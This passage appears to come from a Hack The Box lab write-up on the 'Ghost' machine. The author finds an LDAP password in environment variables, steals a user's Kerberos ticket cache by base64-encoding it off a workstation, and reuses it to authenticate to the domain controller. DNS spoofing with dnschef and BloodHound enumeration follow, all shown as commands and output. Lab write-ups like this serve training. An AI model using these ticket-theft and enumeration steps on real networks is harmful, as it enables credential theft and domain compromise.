class="line">RUST_VERSION=1.79.0</span><br><span class="line">PWD=/</span><br><span class="line">LDAP_BIND_PASSWORD=He!KA9oKVT3rL99j</span><br><span class="line">CARGO_HOME=/usr/local/cargo</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>Now checking our environment variables again, we find a new LDAP_BIND_PASSWORD. But its not of much use right now.<br>However, what we can do is connect directly through ssh on the docker container to this user and try to grab his Kerberos ticket thatâ€™s being used for authentication:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ssh florence.ramirez@ghost.htb@dev-workstation</span></span><br><span class="line">Pseudo-terminal will not be allocated because stdin is not a terminal.</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=50(florence.ramirez) gid=50(staff) <span class="built_in">groups</span>=50(staff),51(it)</span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">florence.ramirez@LINUX-DEV-WS01:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">florence.ramirez@LINUX-DEV-WS01:~$ klist</span><br><span class="line">klist</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_50</span><br><span class="line">Default principal: florence.ramirez@GHOST.HTB</span><br><span class="line"></span><br><span class="line">Valid starting     Expires            Service principal</span><br><span class="line">04/03/25 18:33:01  04/04/25 04:33:01  krbtgt/GHOST.HTB@GHOST.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 04/04/25 18:33:01</span><br><span class="line">florence.ramirez@LINUX-DEV-WS01:~$ <span class="built_in">ls</span> /tmp</span><br><span class="line"><span class="built_in">ls</span> /tmp</span><br><span class="line">init_success  nmbd-stdout---supervisor-j48_1igi.log</span><br><span class="line">krb5cc_50     winbind-stdout---supervisor-o_401b29.log</span><br></pre></td></tr></table></figure></div>

<p>And yes! We can find the user ticket under <code>/tmp/krb5cc_50</code>. Letâ€™s transfer that over to our attacker machine by encoding it to base64 and authenticate with it:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">florence.ramirez@LINUX-DEV-WS01:~$ <span class="built_in">cat</span> /tmp/krb5cc_50 | <span class="built_in">base64</span></span><br><span class="line"><span class="built_in">cat</span> /tmp/krb5cc_50 | <span class="built_in">base64</span></span><br><span class="line">BQQADAABAAgAAAAAAAAAAAAAAAEAAAABAAAACUdIT1NULkhUQgAAABBmbG9yZW5jZS5yYW1pcmV6</span><br><span class="line">AAAAAQAAAAEAAAAJR0hPU1QuSFRCAAAAEGZsb3JlbmNlLnJhbWlyZXoAAAABAAAAAwAAAAxYLUNB</span><br><span class="line">Q0hFQ09ORjoAAAAVa3JiNV9jY2FjaGVfY29uZl9kYXRhAAAAB3BhX3R5cGUAAAAaa3JidGd0L0dI</span><br><span class="line">T1NULkhUQkBHSE9TVC5IVEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEy</span><br><span class="line">AAAAAAAAAAEAAAABAAAACUdIT1NULkhUQgAAABBmbG9yZW5jZS5yYW1pcmV6AAAAAgAAAAIAAAAJ</span><br><span class="line">R0hPU1QuSFRCAAAABmtyYnRndAAAAAlHSE9TVC5IVEIAEgAAACC3LR5jUTydhXgoagdo1g2eNE3/</span><br><span class="line">067ugSK9Q61eQVLTvmfu1Ypn7tWKZ+9iKmfwJwoAAOEAAAAAAAAAAAAAAAAE6mGCBOYwggTioAMC</span><br><span class="line">AQWhCxsJR0hPU1QuSFRCoh4wHKADAgECoRUwExsGa3JidGd0GwlHSE9TVC5IVEKjggSsMIIEqKAD</span><br><span class="line">AgESoQMCAQKiggSaBIIEltBgqf444R3hXcdtXkoqEuCBVdL4mBY4MabnltALRmnOqWOzqTDs+FEc</span><br><span class="line">34g9X5+OJH/OV2lcBJvWpzhCawPq3fFV55NWnX0etvKmhtPTZD4TgBdFOtgpSgp/gjyOswVYNunL</span><br><span class="line">MWj85kG6aE5dcI7sbtREhKr3fKTtLVLLZwBo4x+U33Jx24iuZE2FLvJrLz9MwhVq5MrC7trEWSpk</span><br><span class="line">YrqQEQTdPmIzHYyEX7fzY9GTPWj9BOeYW80loErVewLwxiH0b/VWJhAXPKD2i3nAFOX9ujMx1ce6</span><br><span class="line">FjG9futcwS2HBEp4d23wiHa4NFI9N9KdDzsyM1xqiA9NPuO1O5QHUnw6jYK1wuDYu6RsWFswDfdW</span><br><span class="line">5sJZM/LNr27yLnzwvkT+vUDdEJzk2igXwHk842QRZJGWsP/bJZ102dKEW4GpXDwnd3gDkAcqjyiA</span><br><span class="line">v2aI66jyk+Ere/nhdjLNVfwiPXYQ6aEjepadSy19/4krR0wugb+AZgC9RFOkPLCPnDWKSEnH5e9A</span><br><span class="line">QKL8rhxrKykB9V3Yh/4E17a1x87jT3f265uteQMwyzeUK4k0w4SffpVjKJ2vCBFPZ3yVMewzNCyS</span><br><span class="line">R3szkQFoli3PCVSzfB2cYF9W/XddmcNNS8RHmUHms6jK9mvs3uzLSpzwlNMQKnU4z0TwRTG8E3Kd</span><br><span class="line">wLrPJUcvLuMvwyr9WJ2qIdqB6/vjlqJGS3yfObVY8BxCjpAWRIZynOAhAhujeQ0Pz88bZy1Lf7g5</span><br><span class="line">y6mIpKv4pUZpGllkrnF9NFofdGMd6xcDWp4oQ/0A+lAUMFC/F8aCWAAHAMSRysmEJugOKT6vOEak</span><br><span class="line">EHwS7nOs/FKy5nTMJr6r3otwpRdqQf9Vza0YhkQr4LWSAcVvRs6Yv1aFL0cO7nZdFFaNoV4ZotKD</span><br><span class="line">ttB07zJcwutwJYq24NZs6tJun+pdmPx6pdDJ0P60Qen7Z0oBTJl77NER0iASP1BsFCFup+6TIzmh</span><br><span class="line">w5ioTNOL0feS4BzOp/q+Ihpo3rgGq8437/UWCK853NYsTQul2+JwuVlDYw1L+LdxynjKiaZp8U7W</span><br><span class="line">z/8ExO5JL3jeTvJUCV8rdy/H2h2npqoqoCOJdyEyDRGZlocjoNHxKZ756r2AHrseWhFqAN7RlFi+</span><br><span class="line">cOJnpPheuhjUPKZbISQP7MvmkZ6UXqdSbMZmzKQOh3kVOGIZ0SErigXR4m3eiSyKdWPTSAQ5ky+c</span><br><span class="line">sTmjrKR1QxtxnTLOc9p20c+lSroM8hR2AzEGZfY54uVyOif9aAABeEINDIkyhM9dCBmplGGj0g3u</span><br><span class="line">9NNQ5dIpHCk86FcPCBps0ywOOfG69Ir1VCuRu/KmgFwQGYOpLc1w51bVUIqAYKvBWLGP7Aq+DSWT</span><br><span class="line">0uFeVmIpGnEU1/+spWtC7fwDFcqdU1CEUT0DdrVedz1wQ2VzfZjTIwVpkJCfcttiuBxlRUsWiNUu</span><br><span class="line">uuLqfa3tBN1eJBS/3C9rwFR4UbgZE2ngZAAAEC76WP96TY2H7ti1dpXkqz3sa3YRdxB2/we5iFQe</span><br><span class="line">xMjqnH/7jyoO9eSW1pFHQFlAHf5ztoqcGf1KqQrLL71vcdClH69s5N/kYyXCfmQLm9MAAAAA</span><br></pre></td></tr></table></figure></div>

<p>And now letâ€™s authenticate ourselves with it:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ <span class="built_in">echo</span> <span class="string">&#x27;BQQADAABAAgAAAAAAAAAAAAAAAEAAAABAAAACUdIT1NULkhUQgAAABBmbG9yZW5jZS5yYW1pcmV6</span></span><br><span class="line"><span class="string">AAAAAQAAAAEAAAAJR0hPU1QuSFRCAAAAEGZsb3JlbmNlLnJhbWlyZXoAAAABAAAAAwAAAAxYLUNB</span></span><br><span class="line"><span class="string">Q0hFQ09ORjoAAAAVa3JiNV9jY2FjaGVfY29uZl9kYXRhAAAAB3BhX3R5cGUAAAAaa3JidGd0L0dI</span></span><br><span class="line"><span class="string">T1NULkhUQkBHSE9TVC5IVEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEy</span></span><br><span class="line"><span class="string">AAAAAAAAAAEAAAABAAAACUdIT1NULkhUQgAAABBmbG9yZW5jZS5yYW1pcmV6AAAAAgAAAAIAAAAJ</span></span><br><span class="line"><span class="string">R0hPU1QuSFRCAAAABmtyYnRndAAAAAlHSE9TVC5IVEIAEgAAACC3LR5jUTydhXgoagdo1g2eNE3/</span></span><br><span class="line"><span class="string">067ugSK9Q61eQVLTvmfu1Ypn7tWKZ+9iKmfwJwoAAOEAAAAAAAAAAAAAAAAE6mGCBOYwggTioAMC</span></span><br><span class="line"><span class="string">AQWhCxsJR0hPU1QuSFRCoh4wHKADAgECoRUwExsGa3JidGd0GwlHSE9TVC5IVEKjggSsMIIEqKAD</span></span><br><span class="line"><span class="string">AgESoQMCAQKiggSaBIIEltBgqf444R3hXcdtXkoqEuCBVdL4mBY4MabnltALRmnOqWOzqTDs+FEc</span></span><br><span class="line"><span class="string">34g9X5+OJH/OV2lcBJvWpzhCawPq3fFV55NWnX0etvKmhtPTZD4TgBdFOtgpSgp/gjyOswVYNunL</span></span><br><span class="line"><span class="string">MWj85kG6aE5dcI7sbtREhKr3fKTtLVLLZwBo4x+U33Jx24iuZE2FLvJrLz9MwhVq5MrC7trEWSpk</span></span><br><span class="line"><span class="string">YrqQEQTdPmIzHYyEX7fzY9GTPWj9BOeYW80loErVewLwxiH0b/VWJhAXPKD2i3nAFOX9ujMx1ce6</span></span><br><span class="line"><span class="string">FjG9futcwS2HBEp4d23wiHa4NFI9N9KdDzsyM1xqiA9NPuO1O5QHUnw6jYK1wuDYu6RsWFswDfdW</span></span><br><span class="line"><span class="string">5sJZM/LNr27yLnzwvkT+vUDdEJzk2igXwHk842QRZJGWsP/bJZ102dKEW4GpXDwnd3gDkAcqjyiA</span></span><br><span class="line"><span class="string">v2aI66jyk+Ere/nhdjLNVfwiPXYQ6aEjepadSy19/4krR0wugb+AZgC9RFOkPLCPnDWKSEnH5e9A</span></span><br><span class="line"><span class="string">QKL8rhxrKykB9V3Yh/4E17a1x87jT3f265uteQMwyzeUK4k0w4SffpVjKJ2vCBFPZ3yVMewzNCyS</span></span><br><span class="line"><span class="string">R3szkQFoli3PCVSzfB2cYF9W/XddmcNNS8RHmUHms6jK9mvs3uzLSpzwlNMQKnU4z0TwRTG8E3Kd</span></span><br><span class="line"><span class="string">wLrPJUcvLuMvwyr9WJ2qIdqB6/vjlqJGS3yfObVY8BxCjpAWRIZynOAhAhujeQ0Pz88bZy1Lf7g5</span></span><br><span class="line"><span class="string">y6mIpKv4pUZpGllkrnF9NFofdGMd6xcDWp4oQ/0A+lAUMFC/F8aCWAAHAMSRysmEJugOKT6vOEak</span></span><br><span class="line"><span class="string">EHwS7nOs/FKy5nTMJr6r3otwpRdqQf9Vza0YhkQr4LWSAcVvRs6Yv1aFL0cO7nZdFFaNoV4ZotKD</span></span><br><span class="line"><span class="string">ttB07zJcwutwJYq24NZs6tJun+pdmPx6pdDJ0P60Qen7Z0oBTJl77NER0iASP1BsFCFup+6TIzmh</span></span><br><span class="line"><span class="string">w5ioTNOL0feS4BzOp/q+Ihpo3rgGq8437/UWCK853NYsTQul2+JwuVlDYw1L+LdxynjKiaZp8U7W</span></span><br><span class="line"><span class="string">z/8ExO5JL3jeTvJUCV8rdy/H2h2npqoqoCOJdyEyDRGZlocjoNHxKZ756r2AHrseWhFqAN7RlFi+</span></span><br><span class="line"><span class="string">cOJnpPheuhjUPKZbISQP7MvmkZ6UXqdSbMZmzKQOh3kVOGIZ0SErigXR4m3eiSyKdWPTSAQ5ky+c</span></span><br><span class="line"><span class="string">sTmjrKR1QxtxnTLOc9p20c+lSroM8hR2AzEGZfY54uVyOif9aAABeEINDIkyhM9dCBmplGGj0g3u</span></span><br><span class="line"><span class="string">9NNQ5dIpHCk86FcPCBps0ywOOfG69Ir1VCuRu/KmgFwQGYOpLc1w51bVUIqAYKvBWLGP7Aq+DSWT</span></span><br><span class="line"><span class="string">0uFeVmIpGnEU1/+spWtC7fwDFcqdU1CEUT0DdrVedz1wQ2VzfZjTIwVpkJCfcttiuBxlRUsWiNUu</span></span><br><span class="line"><span class="string">uuLqfa3tBN1eJBS/3C9rwFR4UbgZE2ngZAAAEC76WP96TY2H7ti1dpXkqz3sa3YRdxB2/we5iFQe</span></span><br><span class="line"><span class="string">xMjqnH/7jyoO9eSW1pFHQFlAHf5ztoqcGf1KqQrLL71vcdClH69s5N/kYyXCfmQLm9MAAAAA&#x27;</span> | <span class="built_in">base64</span> -d &gt; ticket.florence.ramirez.kirbi</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ <span class="built_in">export</span> KRB5CCNAME=ticket.florence.ramirez.kirbi </span><br><span class="line">                                                                                                                                                                                                     </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ klist</span><br><span class="line">Ticket cache: FILE:ticket.florence.ramirez.kirbi</span><br><span class="line">Default principal: florence.ramirez@GHOST.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">04/03/2025 18:38:02  04/04/2025 04:38:02  krbtgt/GHOST.HTB@GHOST.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 04/04/2025 18:38:02</span><br><span class="line">                                                         </span><br></pre></td></tr></table></figure></div>

<p>And we can confirm it with this command :</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ nxc smb ghost.htb -u florence.ramirez --use-kcache     </span><br><span class="line">SMB         10.129.231.105  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.231.105  445    DC01             [+] ghost.htb\florence.ramirez from ccache</span><br></pre></td></tr></table></figure></div>

<h4 id="Information-gathering-with-BloodHound-DNS-Spoofing"><a href="#Information-gathering-with-BloodHound-DNS-Spoofing" class="headerlink" title="Information gathering with BloodHound - DNS Spoofing"></a>Information gathering with BloodHound - DNS Spoofing</h4><p>Now since we are authenticated, we can gather info with bloodhound:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ bloodhound-python -u <span class="string">&#x27;florence.ramirez&#x27;</span> -k -ns 10.129.231.105 -d ghost.htb -c all --zip --use-ldap </span><br><span class="line">/usr/lib/python3/dist-packages/bloodhound/ad/utils.py:115: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\-&#x27;</span></span><br><span class="line">  xml_sid_rex = re.compile(<span class="string">&#x27;&lt;UserId&gt;(S-[0-9\-]+)&lt;/UserId&gt;&#x27;</span>)</span><br><span class="line">Password: </span><br><span class="line">INFO: Found AD domain: ghost.htb</span><br><span class="line">INFO: Using TGT from cache</span><br><span class="line">INFO: Found TGT with correct principal <span class="keyword">in</span> ccache file.</span><br><span class="line">INFO: Connecting to LDAP server: dc01.ghost.htb</span><br><span class="line">INFO: Kerberos auth to LDAP failed, trying NTLM</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/usr/bin/bloodhound-python&quot;</span>, line 33, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    sys.exit(load_entry_point(<span class="string">&#x27;bloodhound==1.7.2&#x27;</span>, <span class="string">&#x27;console_scripts&#x27;</span>, <span class="string">&#x27;bloodhound-python&#x27;</span>)())</span><br><span class="line">             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3/dist-packages/bloodhound/__init__.py&quot;</span>, line 343, <span class="keyword">in</span> main</span><br><span class="line">    bloodhound.run(collect=collect,</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3/dist-packages/bloodhound/__init__.py&quot;</span>, line 78, <span class="keyword">in</span> run</span><br><span class="line">    self.pdc.prefetch_info(<span class="string">&#x27;objectprops&#x27;</span> <span class="keyword">in</span> collect, <span class="string">&#x27;acl&#x27;</span> <span class="keyword">in</span> collect, cache_computers=do_computer_enum)</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3/dist-packages/bloodhound/ad/domain.py&quot;</span>, line 571, <span class="keyword">in</span> prefetch_info</span><br><span class="line">    self.get_objecttype()</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3/dist-packages/bloodhound/ad/domain.py&quot;</span>, line 260, <span class="keyword">in</span> get_objecttype</span><br><span class="line">    self.ldap_connect()</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3/dist-packages/bloodhound/ad/domain.py&quot;</span>, line 71, <span class="keyword">in</span> ldap_connect</span><br><span class="line">    ldap = self.ad.auth.getLDAPConnection(hostname=self.hostname, ip=ip,</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3/dist-packages/bloodhound/ad/authentication.py&quot;</span>, line 115, <span class="keyword">in</span> getLDAPConnection</span><br><span class="line">    bound = conn.bind()</span><br><span class="line">            ^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/home/kali/.local/lib/python3.12/site-packages/ldap3/core/connection.py&quot;</span>, line 599, <span class="keyword">in</span> <span class="built_in">bind</span></span><br><span class="line">    self.open(read_server_info=False)</span><br><span class="line">  File <span class="string">&quot;/home/kali/.local/lib/python3.12/site-packages/ldap3/strategy/sync.py&quot;</span>, line 57, <span class="keyword">in</span> open</span><br><span class="line">    BaseStrategy.open(self, reset_usage, read_server_info)</span><br><span class="line">  File <span class="string">&quot;/home/kali/.local/lib/python3.12/site-packages/ldap3/strategy/base.py&quot;</span>, line 154, <span class="keyword">in</span> open</span><br><span class="line">    raise LDAPSocketOpenError(<span class="string">&#x27;invalid server address&#x27;</span>)</span><br><span class="line">ldap3.core.exceptions.LDAPSocketOpenError: invalid server address</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>For some reason I kept on getting this error over and over again. Until I setup my own dns server using dnschef, then it worked like a charm:<br>DNSCHEF config</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ dnschef --fakeip 10.129.231.105 --interface 127.0.0.1</span><br><span class="line">/usr/bin/dnschef:453: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\/&#x27;</span></span><br><span class="line">  header += <span class="string">&quot;      / _` | &#x27;_ \/ __|/ __| &#x27;_ \ / _ \  _|\n&quot;</span></span><br><span class="line">/usr/bin/dnschef:454: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\_&#x27;</span></span><br><span class="line">  header += <span class="string">&quot;     | (_| | | | \__ \ (__| | | |  __/ |  \n&quot;</span></span><br><span class="line">/usr/bin/dnschef:455: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\_&#x27;</span></span><br><span class="line">  header += <span class="string">&quot;      \__,_|_| |_|___/\___|_| |_|\___|_|  \n&quot;</span></span><br><span class="line">          _                _          __  </span><br><span class="line">         | | version 0.4  | |        / _| </span><br><span class="line">       __| |_ __  ___  ___| |__   ___| |_ </span><br><span class="line">      / _` | <span class="string">&#x27;_ \/ __|/ __| &#x27;</span>_ \ / _ \  _|</span><br><span class="line">     | (_| | | | \__ \ (__| | | |  __/ |  </span><br><span class="line">      \__,_|_| |_|___/\___|_| |_|\___|_|  </span><br><span class="line">                   iphelix@thesprawl.org  </span><br><span class="line"></span><br><span class="line">(18:49:35) [*] DNSChef started on interface: 127.0.0.1</span><br><span class="line">(18:49:35) [*] Using the following nameservers: 8.8.8.8</span><br><span class="line">(18:49:35) [*] Cooking all A replies to point to 10.129.231.105</span><br><span class="line">(18:49:48) [*] 127.0.0.1: proxying the response of <span class="built_in">type</span> <span class="string">&#x27;SRV&#x27;</span> <span class="keyword">for</span> _ldap._tcp.pdc._msdcs.ghost.htb</span><br><span class="line">(18:49:48) [*] 127.0.0.1: proxying the response of <span class="built_in">type</span> <span class="string">&#x27;SRV&#x27;</span> <span class="keyword">for</span> _ldap._tcp.pdc._msdcs.ghost.htb.localdomain</span><br><span class="line">(18:49:48) [*] 127.0.0.1: proxying the response of <span class="built_in">type</span> <span class="string">&#x27;SRV&#x27;</span> <span class="keyword">for</span> _ldap._tcp.gc._msdcs.ghost.htb</span><br><span class="line">(18:49:48) [*] 127.0.0.1: proxying the response of <span class="built_in">type</span> <span class="string">&#x27;SRV&#x27;</span> <span class="keyword">for</span> _ldap._tcp.gc._msdcs.ghost.htb.localdomain</span><br><span class="line">(18:49:48) [*] 127.0.0.1: proxying the response of <span class="built_in">type</span> <span class="string">&#x27;SRV&#x27;</span> <span class="keyword">for</span> _kerberos._tcp.dc._msdcs.ghost.htb</span><br><span class="line">(18:49:48) [*] 127.0.0.1: proxying the response of <span class="built_in">type</span> <span class="string">&#x27;SRV&#x27;</span> <span class="keyword">for</span> _kerberos._tcp.dc._msdcs.ghost.htb.localdomain</span><br><span class="line">(18:50:19) [*] 127.0.0.1: proxying the response of <span class="built_in">type</span> <span class="string">&#x27;SRV&#x27;</span> <span class="keyword">for</span> _ldap._tcp.pdc._msdcs.ghost.htb</span><br><span class="line">(18:50:19) [*] 127.0.0.1: proxying the response of <span class="built_in">type</span> <span class="string">&#x27;SRV&#x27;</span> <span class="keyword">for</span> _ldap._tcp.pdc._msdcs.ghost.htb.localdomain</span><br><span class="line">(18:50:19) [*] 127.0.0.1: proxying the response of <span class="built_in">type</span> <span class="string">&#x27;SRV&#x27;</span> <span class="keyword">for</span> _ldap._tcp.gc._msdcs.ghost.htb</span><br><span class="line">(18:50:19) [*] 127.0.0.1: proxying the response of <span class="built_in">type</span> <span class="string">&#x27;SRV&#x27;</span> <span class="keyword">for</span> _ldap._tcp.gc._msdcs.ghost.htb.localdomain</span><br><span class="line">(18:50:19) [*] 127.0.0.1: proxying the response of <span class="built_in">type</span> <span class="string">&#x27;SRV&#x27;</span> <span class="keyword">for</span> _kerberos._tcp.dc._msdcs.ghost.htb</span><br><span class="line">(18:50:19) [*] 127.0.0.1: proxying the response of <span class="built_in">type</span> <span class="string">&#x27;SRV&#x27;</span> <span class="keyword">for</span> _kerberos._tcp.dc._msdcs.ghost.htb.localdomain</span><br><span class="line">(18:50:19) [*] 127.0.0.1: cooking the response of <span class="built_in">type</span> <span class="string">&#x27;A&#x27;</span> <span class="keyword">for</span> dc01.ghost.htb to 10.129.231.105</span><br><span class="line">(18:50:34) [*] 127.0.0.1: cooking the response of <span class="built_in">type</span> <span class="string">&#x27;A&#x27;</span> <span class="keyword">for</span> dc01.ghost.htb to 10.129.231.105</span><br><span class="line">(18:50:42) [*] 127.0.0.1: cooking the response of <span class="built_in">type</span> <span class="string">&#x27;A&#x27;</span> <span class="keyword">for</span> linux-dev-ws01.ghost.htb to 10.129.231.105</span><br><span class="line">(18:50:42) [*] 127.0.0.1: cooking the response of <span class="built_in">type</span> <span class="string">&#x27;A&#x27;</span> <span class="keyword">for</span> DC01.ghost.htb to 10.129.231.105</span><br></pre></td></tr></table></figure></div>

<p>BloodHound:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ bloodhound-python -u <span class="string">&#x27;florence.ramirez&#x27;</span> -k -ns 127.0.0.1 -d ghost.htb -dc dc01.ghost.htb -c all --zip --use-ldap</span><br><span class="line">/usr/lib/python3/dist-packages/bloodhound/ad/utils.py:115: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\-&#x27;</span></span><br><span class="line">  xml_sid_rex = re.compile(<span class="string">&#x27;&lt;UserId&gt;(S-[0-9\-]+)&lt;/UserId&gt;&#x27;</span>)</span><br><span class="line">Password: </span><br><span class="line">WARNING: Could not find a global catalog server, assuming the primary DC has this role</span><br><span class="line">If this gives errors, either specify a hostname with -gc or <span class="built_in">disable</span> gc resolution with --disable-autogc</span><br><span class="line">INFO: Using TGT from cache</span><br><span class="line">INFO: Found TGT with correct principal <span class="keyword">in</span> ccache file.</span><br><span class="line">INFO: Connecting to LDAP server: dc01.ghost.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 2 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 2 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc01.ghost.htb</span><br><span class="line">INFO: Found 16 <span class="built_in">users</span></span><br><span class="line">INFO: Found 57 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 